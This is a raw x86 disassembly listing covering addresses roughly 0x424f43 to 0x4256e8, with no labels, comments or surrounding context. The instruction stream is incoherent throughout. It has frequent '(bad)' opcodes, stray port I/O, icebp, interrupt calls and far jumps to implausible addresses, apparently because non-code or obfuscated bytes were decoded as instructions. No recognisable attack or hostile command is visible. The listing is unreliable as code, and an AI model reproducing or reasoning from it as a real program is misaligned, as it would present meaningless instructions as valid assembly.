  424f43:	pop    edi
  424f44:	sub    esp,eax
  424f46:	inc    edi
  424f47:	rcr    DWORD PTR ds:0x19b82146,0xb7
  424f4e:	fisubr DWORD PTR [ebp+0x6a64a8c3]
  424f54:	icebp  
  424f55:	jae    0x424f53
  424f57:	inc    esi
  424f58:	je     0x424ef6
  424f5a:	sub    DWORD PTR [ebx+0x4c5c266a],edi
  424f60:	fwait
  424f61:	cmp    ebx,DWORD PTR [eax]
  424f63:	xchg   ebx,eax
  424f64:	leave  
  424f65:	dec    ecx
  424f66:	rol    BYTE PTR [esi+0x7],0x5a
  424f6a:	inc    edi
  424f6b:	pop    edi
  424f6c:	add    eax,0x8aa639d
  424f71:	dec    edi
  424f72:	out    dx,eax
  424f73:	sub    ch,dl
  424f75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f76:	pop    ebx
  424f77:	daa    
  424f78:	adc    cl,BYTE PTR [esi]
  424f7a:	nop
  424f7b:	xor    al,BYTE PTR [ebx+0x18]
  424f7e:	scas   eax,DWORD PTR es:[edi]
  424f7f:	repnz jmp 0xeb4b:0xca1a7def
  424f87:	push   0x25
  424f89:	lock add ebp,0x1800141f
  424f90:	rcl    DWORD PTR [esi],0x13
  424f93:	adc    eax,0x935b1917
  424f98:	push   es
  424f99:	(bad)  
  424f9a:	jp     0x424fca
  424f9c:	rcr    BYTE PTR [eax],cl
  424f9e:	and    edi,esp
  424fa0:	mov    eax,0xafe1bd63
  424fa5:	sub    al,0xf1
  424fa7:	test   dh,0x83
  424faa:	jle    0x424fe8
  424fac:	add    eax,0x89694d0b
  424fb1:	jecxz  0x424f98
  424fb3:	adc    edi,edx
  424fb5:	jo     0x424f50
  424fb7:	rcr    BYTE PTR ds:0xb8a724a9,1
  424fbd:	ins    DWORD PTR es:[edi],dx
  424fbe:	popf   
  424fbf:	xchg   esi,eax
  424fc0:	cs stc 
  424fc2:	es mov ch,0x35
  424fc5:	xor    al,0xb5
  424fc7:	sub    dh,dh
  424fc9:	xchg   esp,eax
  424fca:	dec    ebx
  424fcb:	push   esp
  424fcc:	daa    
  424fcd:	adc    edi,DWORD PTR [edx+ecx*1+0x39]
  424fd1:	(bad)  
  424fd2:	(bad)  
  424fd4:	mov    ds,WORD PTR [ecx]
  424fd6:	sub    eax,0x5950e8a4
  424fdb:	xor    DWORD PTR [esi-0x7e327a8b],0xd071aa43
  424fe5:	pop    ebx
  424fe6:	xor    DWORD PTR [ecx],ecx
  424fe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424fe9:	pop    esi
  424fea:	and    DWORD PTR ds:0x9df4fc96,edx
  424ff0:	imul   ecx,DWORD PTR [ebx],0x3c0adec5
  424ff6:	inc    ebp
  424ff7:	out    dx,al
  424ff8:	push   esi
  424ff9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffa:	ror    DWORD PTR [eax+0x41e65cf1],1
  425000:	mov    ds:0x4d944b4a,al
  425005:	mov    edi,0x553a21a8
  42500a:	movaps XMMWORD PTR [eax+edi*1+0x40],xmm0
  42500f:	adc    ebx,DWORD PTR [edi]
  425011:	arpl   si,di
  425013:	sub    esi,DWORD PTR [edi]
  425015:	retf   0xee31
  425018:	push   cs
  425019:	dec    ecx
  42501a:	mov    ah,BYTE PTR [edi-0x17]
  42501d:	fcomp  QWORD PTR [edx-0x3afc5265]
  425023:	imul   al
  425025:	mov    dh,0x87
  425027:	mov    BYTE PTR [eax],al
  425029:	xchg   edi,eax
  42502a:	popa   
  42502b:	mov    ds:0x6640787d,eax
  425030:	sbb    esi,0xf3e6b9b7
  425036:	pop    ss
  425037:	loope  0x42503f
  425039:	xchg   ebp,eax
  42503a:	fistp  DWORD PTR [ecx-0x7fd33031]
  425040:	xchg   esi,eax
  425041:	ret    
  425042:	xor    eax,0x35ec8161
  425047:	xor    DWORD PTR [ecx],0xf81e200b
  42504d:	test   al,0x11
  42504f:	(bad)  
  425050:	ins    BYTE PTR es:[edi],dx
  425051:	mov    edx,0x99bc09ea
  425056:	jg     0x42507c
  425058:	or     al,0xfd
  42505a:	jl     0x4250da
  42505c:	sub    eax,ecx
  42505e:	outs   dx,BYTE PTR ds:[esi]
  42505f:	add    al,0xdb
  425061:	lock jns 0x42503b
  425064:	push   ds
  425065:	bound  ebp,QWORD PTR [ecx+ecx*2]
  425068:	push   0x552ceff3
  42506d:	hlt    
  42506e:	and    BYTE PTR [ecx+edx*8],ch
  425071:	jge    0x425066
  425073:	daa    
  425074:	xor    DWORD PTR [esi+eiz*8+0x40],edi
  425078:	icebp  
  425079:	dec    esp
  42507a:	jl     0x425011
  42507c:	adc    ebp,edi
  42507e:	pushf  
  42507f:	push   edx
  425080:	and    DWORD PTR [ecx+0x33],esp
  425083:	jb     0x4250bb
  425085:	pop    ecx
  425086:	(bad)  
  425087:	mov    esi,0x187525e9
  42508c:	arpl   WORD PTR [ebx+edi*4+0xe],ax
  425090:	jb     0x4250b5
  425092:	pop    es
  425093:	shl    ch,0x5d
  425096:	in     eax,dx
  425097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425098:	mov    ds:0x22aad66e,eax
  42509d:	and    al,0xb2
  42509f:	adc    ecx,ecx
  4250a1:	(bad)  
  4250a2:	push   0x44
  4250a4:	je     0x425039
  4250a6:	jno    0x425111
  4250a8:	enter  0x975d,0x47
  4250ac:	mov    dh,ch
  4250ae:	pop    edi
  4250af:	mov    ebx,0xf1017104
  4250b4:	jge    0x425036
  4250b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4250b7:	add    eax,0x7a5351b7
  4250bc:	ins    DWORD PTR es:[edi],dx
  4250bd:	sub    al,0x20
  4250bf:	ins    BYTE PTR es:[edi],dx
  4250c0:	in     eax,dx
  4250c1:	repnz dec edx
  4250c3:	cmp    esi,DWORD PTR [esi+0x44]
  4250c6:	xchg   edx,eax
  4250c7:	xor    DWORD PTR [eax-0xbfe255c],edx
  4250cd:	inc    ebx
  4250ce:	jp     0x4250ce
  4250d0:	ds out dx,ax
  4250d3:	outs   dx,BYTE PTR ds:[esi]
  4250d4:	clc    
  4250d5:	mov    ecx,0x3f79a323
  4250da:	sub    cl,BYTE PTR [eax]
  4250dc:	inc    edi
  4250dd:	imul   eax,DWORD PTR [edi],0xffffffcc
  4250e0:	stos   BYTE PTR es:[edi],al
  4250e1:	pop    ss
  4250e2:	push   ecx
  4250e3:	hlt    
  4250e4:	ret    
  4250e5:	sahf   
  4250e6:	icebp  
  4250e7:	mov    edi,0xbf17a3ea
  4250ec:	out    dx,eax
  4250ed:	jne    0x425083
  4250ef:	jno    0x42515c
  4250f1:	aas    
  4250f2:	inc    edi
  4250f3:	xchg   esp,eax
  4250f4:	pop    es
  4250f5:	les    ebx,FWORD PTR [ecx]
  4250f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4250f8:	pop    ss
  4250f9:	cmp    al,0x43
  4250fb:	daa    
  4250fc:	in     eax,dx
  4250fd:	fidiv  DWORD PTR [ebx-0x51]
  425100:	adc    BYTE PTR [ebp-0x6e],0x0
  425104:	add    BYTE PTR [eax],al
  425106:	add    BYTE PTR [eax],al
  425108:	add    BYTE PTR [eax],al
  42510a:	pop    ecx
  42510b:	push   ebp
  42510c:	push   esp
  42510d:	push   edx
  42510e:	pop    esp
  42510f:	push   ebx
  425110:	pop    edi
  425111:	pop    edi
  425112:	xchg   ebx,eax
  425113:	stos   DWORD PTR es:[edi],eax
  425114:	mov    ebx,0x3ff41c96
  425119:	mov    al,0xdf
  42511b:	fiadd  WORD PTR [ecx]
  42511d:	add    BYTE PTR [ecx-0x15fffffa],al
  425123:	in     eax,0x7
  425125:	ss inc esi
  425127:	loopne 0x42518a
  425129:	imul   edx,DWORD PTR [edx+edx*1],0xf5c24a52
  425130:	aam    0x3d
  425132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425133:	mov    dl,0x52
  425135:	int    0xe5
  425137:	(bad)  
  425139:	push   ebx
  42513a:	jle    0x42512b
  42513c:	push   ebx
  42513d:	xchg   ebx,eax
  42513e:	int    0xbb
  425140:	mov    ds:0x1e651efb,eax
  425145:	jp     0x4250f9
  425147:	daa    
  425148:	adc    eax,0x8e23eddc
  42514d:	mov    ebx,DWORD PTR ds:0x28aaf52
  425153:	mov    bh,0xce
  425155:	xor    bh,BYTE PTR [ebx-0x4df92b53]
  42515b:	daa    
  42515c:	xchg   edx,eax
  42515d:	shl    bl,1
  42515f:	lock pop ss
  425161:	ret    0x9c3c
  425164:	add    al,0x69
  425166:	repz pushf 
  425168:	inc    esi
  425169:	cwde   
  42516a:	inc    ebx
  42516b:	stos   DWORD PTR es:[edi],eax
  42516c:	jmp    0x4251dc
  42516e:	lods   al,BYTE PTR ds:[esi]
  42516f:	test   DWORD PTR [ecx],ecx
  425171:	xor    DWORD PTR [ecx],ebp
  425173:	push   edi
  425174:	int    0x84
  425176:	jb     0x4251d9
  425178:	jae    0x4251c2
  42517a:	scas   al,BYTE PTR es:[edi]
  42517b:	loope  0x4251a7
  42517d:	push   ebp
  42517e:	push   cs
  42517f:	iret   
  425180:	or     BYTE PTR [edi+edi*8-0x19],al
  425184:	repnz repz mov eax,0x82be36a6
  42518b:	mov    eax,0xca06544f
  425190:	inc    ebp
  425191:	int    0x34
  425193:	sub    BYTE PTR [ebx+0x75b1c892],dh
  425199:	(bad)  
  42519a:	add    edi,DWORD PTR [edx+ecx*2+0x4d9dd639]
  4251a1:	mov    ecx,0x491901ce
  4251a6:	jb     0x42520c
  4251a8:	into   
  4251a9:	ins    BYTE PTR es:[edi],dx
  4251aa:	inc    ebp
  4251ab:	and    DWORD PTR [eax-0x20],esp
  4251ae:	xor    eax,DWORD PTR [edx+0x2cd22da7]
  4251b4:	loop   0x4251c2
  4251b6:	loopne 0x4251ec
  4251b8:	clc    
  4251b9:	(bad)  
  4251ba:	bound  edi,QWORD PTR [ebx]
  4251bc:	xor    esp,DWORD PTR [edi-0x25]
  4251bf:	xchg   ebp,eax
  4251c0:	or     eax,0xd9215b25
  4251c5:	imul   eax,ecx,0xee959f33
  4251cb:	push   0x1d
  4251cd:	or     al,0xd2
  4251cf:	popa   
  4251d0:	out    dx,al
  4251d1:	outs   dx,DWORD PTR cs:[esi]
  4251d3:	retf   0x42f5
  4251d6:	pop    ds
  4251d7:	call   0xa5053ffa
  4251dc:	mov    cl,0xb8
  4251de:	ficomp WORD PTR [edi+0x2f]
  4251e1:	mov    ch,0xb4
  4251e3:	ss out 0xc9,al
  4251e6:	imul   eax,DWORD PTR [ebp+edi*1+0x40],0x14
  4251eb:	pop    edi
  4251ec:	or     bh,ah
  4251ee:	xor    ah,bh
  4251f0:	inc    edi
  4251f1:	nop
  4251f2:	jge    0x425228
  4251f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4251f5:	add    BYTE PTR [eax+eiz*1+0x5ec3c252],0x84
  4251fd:	or     ah,dh
  4251ff:	lea    edi,[ebp+0x12]
  425202:	adc    BYTE PTR [ebp+0x41],bl
  425205:	test   bh,al
  425207:	xchg   DWORD PTR [esi],ebp
  425209:	lock pop esp
  42520b:	loop   0x42520b
  42520d:	sub    al,0x7a
  42520f:	gs push 0xffffffd4
  425212:	cmc    
  425213:	inc    ebx
  425214:	in     eax,0x5f
  425216:	dec    ebx
  425218:	outs   dx,BYTE PTR ds:[esi]
  42521a:	push   eax
  42521b:	inc    ebp
  42521c:	jl     0x425219
  42521e:	pop    ebx
  42521f:	add    al,0xf5
  425221:	and    al,0x5d
  425223:	and    BYTE PTR [edi+0x23],bh
  425226:	sbb    DWORD PTR [edx-0x4edf88e4],ebx
  42522c:	fimul  DWORD PTR [edi-0x2d]
  42522f:	enter  0xa9b7,0x9c
  425233:	in     al,0x23
  425235:	and    ch,bl
  425237:	sbb    BYTE PTR [eax+ebx*2+0x77],cl
  42523b:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42523d:	jmp    0xbaa27392
  425242:	(bad)
  425247:	adc    ebp,ecx
  425249:	or     ecx,DWORD PTR [esi+esi*8]
  42524c:	adc    BYTE PTR [edx-0x323be657],0x6c
  425253:	pop    esi
  425254:	out    dx,al
  425255:	out    dx,al
  425256:	pop    eax
  425257:	(bad)
  42525a:	add    BYTE PTR [edi-0x3e145d6e],dh
  425260:	outs   dx,BYTE PTR ds:[esi]
  425261:	fucom  st(5)
  425263:	das    
  425264:	mov    dh,0x31
  425266:	fstp   TBYTE PTR [ebx-0x4fee5376]
  42526c:	mov    ebx,DWORD PTR [ecx-0x5082c410]
  425272:	push   ss
  425273:	sar    DWORD PTR [ebx+0x1c],cl
  425276:	pop    ss
  425277:	inc    esi
  425278:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425279:	in     al,dx
  42527a:	jne    0x42522a
  42527c:	pushf  
  42527d:	push   cs
  42527e:	shl    BYTE PTR [edx+eax*1-0x79febd69],1
  425285:	popa   
  425286:	push   eax
  425287:	loop   0x4252b3
  425289:	sbb    BYTE PTR [ebx+0x5d],dl
  42528c:	fwait
  42528d:	call   0x67e4bb19
  425292:	jae    0x425258
  425294:	test   eax,0xfd3d6d0d
  425299:	pop    edx
  42529a:	push   es
  42529b:	rcl    DWORD PTR [esi],cl
  42529d:	adc    al,cl
  42529f:	or     al,0x3e
  4252a1:	and    DWORD PTR [edi-0x59602030],0x9e0df2d9
  4252ab:	dec    edi
  4252ac:	stos   DWORD PTR es:[edi],eax
  4252ad:	pusha  
  4252ae:	push   ds
  4252af:	pop    ds
  4252b0:	add    eax,0x243eaea2
  4252b5:	or     bh,bh
  4252b7:	(bad)  
  4252b8:	or     DWORD PTR [edi-0x29],edi
  4252bb:	rol    dl,1
  4252bd:	iret   
  4252be:	mov    cl,0xfe
  4252c0:	push   esi
  4252c1:	xchg   edx,eax
  4252c2:	mov    ch,bl
  4252c4:	lahf   
  4252c5:	retf   
  4252c6:	push   edi
  4252c7:	enter  0x7853,0xd
  4252cb:	jmp    FWORD PTR [ebx+0x74]
  4252ce:	das    
  4252cf:	fnstcw WORD PTR [ebx-0x15870cb]
  4252d5:	fwait
  4252d6:	in     eax,dx
  4252d7:	test   BYTE PTR [esi],bl
  4252d9:	jecxz  0x42527f
  4252db:	xor    DWORD PTR ds:0x7bd33e9a,ecx
  4252e1:	ja     0x4252e7
  4252e3:	repz fist DWORD PTR [eax+0x148d5ac9]
  4252ea:	cmc    
  4252eb:	and    BYTE PTR [edi-0xcd1ed0d],bl
  4252f1:	inc    edi
  4252f2:	cmp    bl,BYTE PTR [ebx-0x22e4fa15]
  4252f8:	fistp  WORD PTR [edx]
  4252fa:	ins    DWORD PTR es:[edi],dx
  4252fb:	in     eax,dx
  4252fc:	push   ebp
  4252fd:	xor    al,0x3d
  4252ff:	mov    ebx,0xebcd7f52
  425304:	cdq    
  425305:	pop    esp
  425306:	sub    bh,BYTE PTR [edi+0x3e]
  425309:	dec    eax
  42530a:	hlt    
  42530b:	(bad)  
  42530c:	or     eax,0xa65120b3
  425311:	inc    ecx
  425312:	cmp    ah,BYTE PTR [eax-0x2429bfdd]
  425318:	jns    0x42534a
  42531a:	sbb    al,bh
  42531c:	and    DWORD PTR [ecx+0x27],0x51
  425320:	stos   DWORD PTR es:[edi],eax
  425321:	loop   0x425310
  425323:	mov    eax,0x780eaf1a
  425328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425329:	(bad)  
  42532b:	loop   0x4252f0
  42532d:	cld    
  42532e:	xor    BYTE PTR [edi+0x15],al
  425331:	mov    ?,edi
  425333:	cmp    dh,BYTE PTR [ebx-0x77]
  425336:	pop    edx
  425337:	fldcw  WORD PTR [ebp+0x24d4c8d8]
  42533d:	addr16 jns 0x425349
  425340:	aam    0x1c
  425342:	or     ecx,ebp
  425344:	dec    eax
  425345:	push   ecx
  425346:	in     eax,0x71
  425348:	dec    ebp
  425349:	into   
  42534a:	leave  
  42534b:	dec    esp
  42534c:	xchg   esp,esp
  42534e:	dec    ebp
  42534f:	xchg   ecx,eax
  425350:	sbb    eax,0x797bf4a0
  425355:	and    cl,BYTE PTR [edi+0x11]
  425358:	or     BYTE PTR [ecx],bl
  42535a:	xchg   ecx,eax
  42535b:	std    
  42535c:	cmp    dl,BYTE PTR [ecx]
  42535e:	out    dx,al
  42535f:	cmc    
  425360:	jl     0x425385
  425362:	hlt    
  425363:	xchg   esp,eax
  425364:	mov    fs,WORD PTR [eax+0x53]
  425367:	stos   BYTE PTR es:[edi],al
  425368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425369:	inc    edi
  42536a:	pop    edx
  42536b:	xchg   esi,eax
  42536c:	(bad)  
  42536d:	pop    ecx
  42536e:	icebp  
  42536f:	out    0x28,eax
  425371:	dec    edx
  425372:	cmp    al,0xf7
  425374:	jno    0x42535b
  425376:	mov    eax,0x4837e40f
  42537b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42537c:	mov    WORD PTR [esi-0x75c60403],ds
  425382:	outs   dx,DWORD PTR ds:[esi]
  425383:	add    DWORD PTR [eax-0x71],edx
  425386:	les    sp,DWORD PTR [edx-0x54fef3c8]
  42538d:	les    eax,FWORD PTR [ebx+0x3c9de5b2]
  425393:	dec    ecx
  425394:	imul   DWORD PTR [ebp+eiz*1-0x48]
  425398:	xchg   esi,eax
  425399:	int3   
  42539a:	mov    bh,0xea
  42539c:	push   ss
  42539d:	xchg   ecx,eax
  42539e:	dec    edx
  42539f:	scas   eax,DWORD PTR es:[edi]
  4253a0:	sbb    DWORD PTR [eax+0x1d6d19f4],0x711b3fea
  4253aa:	stos   BYTE PTR es:[edi],al
  4253ab:	mov    ds:0x54a94fbb,eax
  4253b0:	adc    al,0x72
  4253b2:	mov    eax,0xb669b0e6
  4253b7:	sub    edx,edx
  4253b9:	dec    esi
  4253ba:	or     DWORD PTR [ebx+0x52bf107b],edx
  4253c0:	push   esp
  4253c1:	or     eax,0x68f6ffc1
  4253c6:	inc    edx
  4253c7:	dec    edx
  4253c8:	imul   esp,DWORD PTR [edi+ecx*8],0x5dadde
  4253cf:	mov    ds:0xcccd9c71,al
  4253d4:	int    0x97
  4253d6:	xlat   BYTE PTR ds:[ebx]
  4253d7:	fstp   QWORD PTR [ebp-0x3172b7e2]
  4253dd:	dec    ebx
  4253de:	sub    esi,DWORD PTR [edx-0x4be175f8]
  4253e4:	das    
  4253e5:	dec    edi
  4253e6:	(bad)  
  4253e7:	stc    
  4253e8:	div    DWORD PTR [ebx-0x31]
  4253eb:	scas   al,BYTE PTR es:[edi]
  4253ec:	jo     0x425461
  4253ee:	call   FWORD PTR [eax+ebx*8+0x2a]
  4253f2:	adc    ecx,esi
  4253f4:	aas    
  4253f5:	cld    
  4253f6:	(bad)  
  4253f7:	outs   dx,BYTE PTR ds:[esi]
  4253f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253f9:	push   ecx
  4253fa:	les    di,DWORD PTR [edx]
  4253fd:	inc    ebp
  4253fe:	call   0xef8daa8f
  425403:	ins    DWORD PTR es:[edi],dx
  425404:	jb     0x425444
  425406:	pop    ds
  425407:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425408:	addr16 ret 
  42540a:	mov    esi,DWORD PTR fs:[edi+0x34]
  42540e:	popa   
  42540f:	or     eax,0xf8bf1b85
  425414:	xchg   ebp,eax
  425415:	sahf   
  425416:	mov    bh,0x78
  425418:	(bad)  
  425419:	int3   
  42541a:	push   ds
  42541b:	enter  0x4e95,0x82
  42541f:	or     BYTE PTR [edx-0x63],ch
  425422:	(bad)  
  425423:	adc    bh,dh
  425425:	retf   0x6fd5
  425428:	test   DWORD PTR [edi-0x425dce79],edi
  42542e:	mov    bl,BYTE PTR [ebx+0x7dacc0e3]
  425434:	xchg   edx,eax
  425435:	jmp    0x42549f
  425437:	jmp    0x68dcf2ca
  42543c:	jle    0x425461
  42543e:	push   esp
  42543f:	lock dec eax
  425441:	pop    es
  425442:	js     0x42547f
  425444:	push   ebp
  425445:	popf   
  425446:	lea    edi,[eax]
  425448:	jmp    0x4254a1
  42544a:	mov    bh,0x53
  42544c:	popw   ds
  42544e:	pop    ecx
  42544f:	in     eax,dx
  425450:	or     dl,BYTE PTR [ebp-0x687737f4]
  425456:	push   edi
  425457:	lock jns 0x4253fc
  42545a:	scas   al,BYTE PTR es:[edi]
  42545b:	xor    al,0x3d
  42545d:	jns    0x425426
  42545f:	jb     0x42545e
  425461:	or     ch,BYTE PTR [edi+ebp*1+0x3b7ebedc]
  425468:	mov    edi,0xe56253a2
  42546d:	push   ecx
  42546e:	push   cs
  42546f:	xor    eax,0x88160126
  425474:	mov    edi,0xf17c5b9b
  425479:	enter  0x6563,0x67
  42547d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42547e:	dec    esi
  42547f:	cmp    DWORD PTR [ecx],eax
  425481:	and    al,0xde
  425483:	add    si,di
  425486:	and    BYTE PTR [eax],ah
  425488:	jbe    0x42548a
  42548a:	cmp    ebp,DWORD PTR [edx+0xc18ce8e]
  425490:	scas   eax,DWORD PTR es:[edi]
  425491:	xor    ecx,ebx
  425493:	push   ecx
  425494:	lock aas 
  425496:	sub    eax,0x1fcf6309
  42549b:	mov    eax,0x356138c9
  4254a0:	pop    esp
  4254a1:	and    edi,esi
  4254a3:	ror    BYTE PTR [ebx+0x49817bd9],0x41
  4254aa:	leave  
  4254ab:	cmp    eax,0x9490bc0c
  4254b0:	out    dx,al
  4254b1:	out    dx,al
  4254b2:	int    0xd7
  4254b4:	sbb    BYTE PTR [edi-0x2c4b93ed],bh
  4254ba:	js     0x425463
  4254bc:	xor    al,0xd2
  4254be:	xor    eax,0xb70f75fb
  4254c3:	stos   DWORD PTR es:[edi],eax
  4254c4:	sbb    ebp,DWORD PTR [esp+eiz*8-0x3f]
  4254c8:	data16 clc 
  4254ca:	sub    cl,BYTE PTR [ebx-0x4]
  4254cd:	or     eax,0xd12fea1f
  4254d2:	lock mov dl,0xd3
  4254d5:	sub    dh,BYTE PTR [ebx-0x44]
  4254d8:	inc    esp
  4254d9:	pop    ebp
  4254da:	dec    ebp
  4254db:	test   DWORD PTR [esi],eax
  4254dd:	add    cl,dh
  4254df:	mov    DWORD PTR [ecx*1+0x7ea2a07d],ebx
  4254e6:	jae    0x425529
  4254e8:	push   0xb0f2d0db
  4254ed:	test   DWORD PTR [ebp-0x639da358],esi
  4254f3:	mov    cl,0xe6
  4254f5:	jnp    0x425477
  4254f7:	mov    eax,0x579b4ad6
  4254fc:	cmp    DWORD PTR [esi],esi
  4254fe:	inc    ebx
  4254ff:	mov    ecx,0xe9c86899
  425504:	jg     0x4254ae
  425506:	push   esi
  425507:	fcmovnb st,st(2)
  425509:	aam    0xf6
  42550b:	test   eax,0x329a5ba2
  425510:	aad    0xb6
  425512:	add    BYTE PTR [ecx+0x26],dl
  425515:	hlt    
  425516:	xchg   bh,bl
  425518:	gs dec ebx
  42551a:	sub    dh,al
  42551c:	push   edx
  42551d:	scas   eax,DWORD PTR es:[edi]
  42551e:	mov    al,ds:0x38faeb06
  425523:	aaa    
  425524:	xchg   edi,eax
  425525:	xchg   esi,eax
  425526:	jge    0x4254bd
  425528:	inc    ecx
  425529:	outs   dx,DWORD PTR ds:[esi]
  42552a:	ins    DWORD PTR es:[edi],dx
  42552b:	ins    DWORD PTR es:[edi],dx
  42552c:	pop    eax
  42552d:	es mov dh,0x23
  425530:	xor    eax,0x5438c62a
  425535:	lea    ebp,[esi-0x73e382de]
  42553b:	jmp    FWORD PTR [ebp+eiz*4-0x6f29c5c2]
  425542:	sub    al,BYTE PTR [edi]
  425544:	shl    BYTE PTR [esi+0x40],1
  425547:	lods   eax,DWORD PTR ds:[esi]
  425548:	cli    
  425549:	cs aad 0x8c
  42554c:	push   0xfffffff6
  42554e:	dec    esi
  42554f:	inc    ebx
  425550:	and    eax,0x64defe2b
  425555:	js     0x425515
  425557:	call   0x6c219af0
  42555c:	sub    DWORD PTR [ebx+0x1],esi
  42555f:	jb     0x4255c8
  425561:	inc    edx
  425562:	and    al,0xd1
  425564:	cmp    eax,0x6bfe355a
  425569:	fisub  DWORD PTR [edx-0x291e5931]
  42556f:	out    0x32,eax
  425571:	and    BYTE PTR [edx],ah
  425573:	lods   eax,DWORD PTR ds:[esi]
  425574:	retf   
  425575:	cmp    al,0xb6
  425577:	xchg   edx,eax
  425578:	xor    BYTE PTR [eax-0x64],ah
  42557b:	leave  
  42557c:	jle    0x4255c9
  42557e:	or     eax,esi
  425580:	out    dx,eax
  425581:	inc    ebx
  425582:	aaa    
  425583:	call   0x224a06b3
  425588:	loop   0x425519
  42558a:	adc    ebp,DWORD PTR [edi]
  42558c:	adc    cl,BYTE PTR [edx-0x8]
  42558f:	std    
  425590:	int    0xce
  425592:	out    0xe6,al
  425594:	push   0xcd2c7ea3
  425599:	lahf   
  42559a:	fmul   DWORD PTR [edi+esi*2+0x37d6c319]
  4255a1:	xchg   ecx,eax
  4255a2:	mov    edi,0xca240a97
  4255a7:	mov    edx,0x3453dc4
  4255ac:	hlt    
  4255ad:	dec    esi
  4255ae:	push   0x63
  4255b0:	aaa    
  4255b1:	add    al,0x22
  4255b3:	or     eax,0x330a82d9
  4255b8:	jecxz  0x4255ee
  4255ba:	dec    esp
  4255bb:	and    al,0x37
  4255bd:	sbb    ecx,DWORD PTR [edi-0x74]
  4255c0:	jmp    0x4255d7
  4255c2:	mov    eax,ds:0x85faf2c7
  4255c7:	mov    edi,0xe3b6b05e
  4255cc:	jne    0x4255df
  4255ce:	jecxz  0x4255c0
  4255d0:	push   esi
  4255d1:	or     al,0xf1
  4255d3:	in     al,dx
  4255d4:	test   al,0x8d
  4255d6:	fdivr  QWORD PTR [edx+0x46]
  4255d9:	and    DWORD PTR [edi+0x2e70a9db],eax
  4255df:	test   BYTE PTR [edi],bl
  4255e1:	lds    esi,FWORD PTR [edi-0x2ef33c27]
  4255e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4255e8:	mov    ds:0x77dc8d4f,al
  4255ed:	push   eax
  4255ee:	daa    
  4255ef:	icebp  
  4255f0:	cs pop edx
  4255f2:	add    ah,dl
  4255f4:	inc    ebp
  4255f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4255f6:	push   eax
  4255f7:	push   0xd697474c
  4255fc:	ret    
  4255fd:	inc    ebx
  4255fe:	mov    ah,0xdd
  425600:	xchg   ebx,eax
  425601:	sti    
  425602:	leave  
  425603:	push   0x296f7e4d
  425608:	les    esi,FWORD PTR [esp+ebx*2-0x2f]
  42560c:	or     bl,bh
  42560e:	xchg   esi,eax
  42560f:	std    
  425610:	push   es
  425611:	aad    0x9e
  425613:	retf   0x9a12
  425616:	mov    edi,DWORD PTR [edx]
  425618:	dec    eax
  425619:	pop    esp
  42561a:	leave  
  42561b:	mov    esp,DWORD PTR [eax-0x3e]
  42561e:	pop    ecx
  42561f:	dec    edi
  425620:	inc    ebp
  425621:	xor    edi,DWORD PTR [ecx+0x76e1049e]
  425627:	xlat   BYTE PTR ds:[ebx]
  425628:	jmp    0x4255d4
  42562a:	or     ebx,edi
  42562c:	xchg   dl,ch
  42562e:	mov    dl,BYTE PTR [edx]
  425630:	in     al,0x30
  425632:	shl    dl,cl
  425634:	xchg   ebx,eax
  425635:	push   0x3fd748eb
  42563a:	retf   0x1777
  42563d:	icebp  
  42563e:	repnz push ebp
  425640:	xor    DWORD PTR [edi-0x2c],ebx
  425643:	aad    0x77
  425645:	imul   esp,DWORD PTR [esi+0xa69ca66],0x468d4f19
  42564f:	or     al,0x86
  425651:	mov    eax,ds:0x7e0a266f
  425656:	xor    al,0xc
  425658:	in     al,dx
  425659:	jb     0x425662
  42565b:	jmp    0xa0d16889
  425660:	fmul   DWORD PTR [eax+edi*1-0x48]
  425664:	adc    dl,BYTE PTR gs:[eax]
  425667:	arpl   bx,bp
  425669:	ss aas 
  42566b:	and    DWORD PTR [ecx+ecx*1-0x3f29621e],0x3277ee45
  425676:	mov    ebp,0x5a4f3ba8
  42567b:	(bad)  
  42567c:	sar    DWORD PTR [eax+0xd6164d],1
  425682:	pop    esi
  425683:	inc    ebx
  425684:	mov    eax,0xd7375237
  425689:	or     dl,BYTE PTR [edx+0x760f81ad]
  42568f:	stos   DWORD PTR es:[edi],eax
  425690:	mov    bh,0xe7
  425692:	jno    0x4256f0
  425694:	dec    edi
  425695:	ret    
  425696:	dec    edx
  425697:	xchg   DWORD PTR [esi+esi*8],edx
  42569a:	adc    dl,BYTE PTR [ebx+0x2]
  42569d:	sub    al,0x2a
  42569f:	rol    ecx,1
  4256a1:	add    ecx,DWORD PTR [eax+edi*8+0x59]
  4256a5:	aam    0xa6
  4256a7:	and    WORD PTR [edx+0x5e772f46],0xe6d3
  4256b0:	test   edi,eax
  4256b2:	pushf  
  4256b3:	dec    esp
  4256b4:	fistp  DWORD PTR [eax+0x2]
  4256b7:	sbb    eax,0xd59db836
  4256bc:	inc    ebp
  4256bd:	and    DWORD PTR [esi],0xffffffcd
  4256c0:	enter  0xc601,0xa4
  4256c4:	jne    0x425733
  4256c6:	add    al,0x64
  4256c8:	(bad)  
  4256cb:	pop    ebx
  4256cc:	gs cs (bad) 
  4256cf:	fadd   DWORD PTR [ecx-0x48133993]
  4256d5:	inc    eax
  4256d6:	mov    ecx,0x8f993af6
  4256db:	ins    DWORD PTR es:[edi],dx
  4256dc:	loop   0x4256bf
  4256de:	adc    eax,edi
  4256e0:	and    BYTE PTR [ebx-0x558b6619],0x1b
  4256e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4256e8:	add    BYTE PTR [eax+0x1],ch
